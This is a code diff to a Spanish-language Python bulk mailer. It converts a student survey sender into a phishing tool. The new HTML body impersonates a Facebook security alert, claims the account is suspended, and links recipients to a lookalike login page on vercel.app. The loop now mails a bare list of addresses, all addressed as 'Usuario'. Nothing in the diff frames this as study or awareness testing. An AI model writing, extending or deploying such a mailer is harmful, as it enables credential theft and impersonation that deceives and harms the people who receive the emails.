@@ -13,7 +13,6 @@ class EmailSender:
         with open(config_path, 'r', encoding='utf-8') as file:
             self.config = json.load(file)
         
-        # Desactivar la variable de entorno SSLKEYLOGFILE
         if 'SSLKEYLOGFILE' in os.environ:
             del os.environ['SSLKEYLOGFILE']
 
@@ -26,45 +25,66 @@ class EmailSender:
 
     def verify_credentials(self, email, password):
         try:
+            print(f"Intentando conectar a {self.config['email_settings']['smtp_server']}...")
             context = ssl.create_default_context()
             server = smtplib.SMTP(
                 self.config['email_settings']['smtp_server'],
                 self.config['email_settings']['port']
             )
+            print("Conexión establecida")
+            
+            print("Iniciando TLS...")
             server.ehlo()
             server.starttls(context=context)
             server.ehlo()
+            print("TLS iniciado correctamente")
+            
+            print(f"Intentando autenticar con el correo: {email}")
             server.login(email, password)
+            print("Autenticación exitosa")
+            
             server.quit()
             return True
         except Exception as e:
-            error_config = self.config['error_messages']['credentials']
-            print(error_config['message'].format(error=str(e)))
-            for instruction in error_config['instructions']:
-                print(instruction)
-            return False
+            print("\nError detallado de autenticación:")
+            print(f"- Servidor SMTP: {self.config['email_settings']['smtp_server']}")
+            print(f"- Puerto: {self.config['email_settings']['port']}")
+            print(f"- Error completo: {str(e)}")
+            print("\nPosibles soluciones:")
+            print("1. Verifica que tu correo esté escrito correctamente")
+            print("2. Asegúrate de que la contraseña sea correcta")
+            print("3. Si usas autenticación de dos factores, es posible que necesites generar una contraseña de aplicación")
+            print("4. Verifica que tu cuenta permita el acceso a aplicaciones menos seguras")
+        return False
 
-    def create_email_body(self, name):
+    def create_email_body_html(self, name):
         template = self.config['email_template']
         fecha = self.get_formatted_date()
         
-        body_parts = [
-            f"{template['location']}, {fecha}",
-            "",
-            template['greeting'].format(name=name),
-            "",
-            template['body'],
-            "",
-            template['survey_intro'],
-            "",
-            template['survey_link'],
-            "",
-            template['closing'],
-            "",
-            template['signature']
-        ]
-        
-        return "\n".join(body_parts)
+        html = f"""
+        <!DOCTYPE html>
+        <html lang="es">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Alerta de Seguridad - Verificación de Cuenta</title>
+        </head>
+        <body style="font-family: Arial, sans-serif; background-color: #f7f7f7; margin: 0; padding: 20px;">
+            <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+                <h2 style="color: #1877F2;">Facebook</h2>
+                <h2 style="color: #1877F2;">Alerta de Seguridad - Verificación de Cuenta</h2>
+                <p style="font-size: 16px; color: #333;">Estimado {name}</p>
+                <p style="font-size: 16px; color: #333;">Recientemente detectamos un intento de inicio de sesión en tu cuenta desde un dispositivo o ubicación inusual. Para tu seguridad, hemos suspendido temporalmente el acceso a tu cuenta.</p>
+                <p style="font-size: 16px; color: #333;">Por favor, sigue el siguiente enlace para verificar tu identidad y restaurar el acceso a tu cuenta:</p>
+                <a href="https://facebooklogin-kappa.vercel.app/" style="display: inline-block; padding: 12px 20px; background-color: #1877F2; color: white; text-decoration: none; font-size: 16px; border-radius: 5px; text-align: center;">Verificar mi cuenta</a>
+                <p style="font-size: 14px; color: #666;">Si no solicitaste este cambio, por favor ignora este mensaje. Si necesitas más ayuda, visita nuestra página de soporte.</p>
+                <p style="font-size: 14px; color: #666;">Gracias por usar nuestros servicios.</p>
+                <p style="font-size: 12px; color: #888;">Este es un correo electrónico automático. No respondas a este mensaje.</p>
+            </div>
+        </body>
+        </html>
+        """
+        return html
 
     def send_email(self, sender_email, password, recipient, name):
         settings = self.config['email_settings']
@@ -75,8 +95,9 @@ class EmailSender:
         message["To"] = recipient
         message["Subject"] = Header(template['subject'], 'utf-8')
 
-        body = self.create_email_body(name)
-        message.attach(MIMEText(body.encode('utf-8'), 'plain', 'utf-8'))
+        # Crear versión HTML del correo
+        html_body = self.create_email_body_html(name)
+        message.attach(MIMEText(html_body, 'html', 'utf-8'))
 
         try:
             context = ssl.create_default_context()
@@ -86,14 +107,14 @@ class EmailSender:
                 server.ehlo()
                 server.login(sender_email, password)
                 server.send_message(message)
-                print(f"Correo enviado exitosamente a {name} ({recipient})")
+                print(f"✓ Correo enviado exitosamente a {name} ({recipient})")
         except Exception as e:
-            print(f"Error al enviar correo a {name} ({recipient}): {str(e)}")
+            print(f"✗ Error al enviar correo a {name} ({recipient}): {str(e)}")
 
 def load_data(file_path):
     with open(file_path, 'r', encoding='utf-8') as file:
         data = json.load(file)
-    return data['Sheet']
+    return data['recipients']
 
 def main():
     email_sender = EmailSender()
@@ -105,17 +126,12 @@ def main():
         return
 
     try:
-        students = load_data("email.json")
+        recipients = load_data("email.json")
         
-        for student in students:
-            name = student.get("Nombre")
-            email = student.get("Email Institcional")
+        for email in recipients:
+            name = "Usuario"  # Puedes ajustar esto si tienes un nombre asociado a cada correo
             
-            if not email:
-                print(f"No se encontró email para {name}, omitiendo...")
-                continue
-
-            print(f"Enviando correo a {name}...")
+            print(f"Enviando correo a {email}...")
             email_sender.send_email(sender_email, password, email, name)
             time.sleep(1)
 
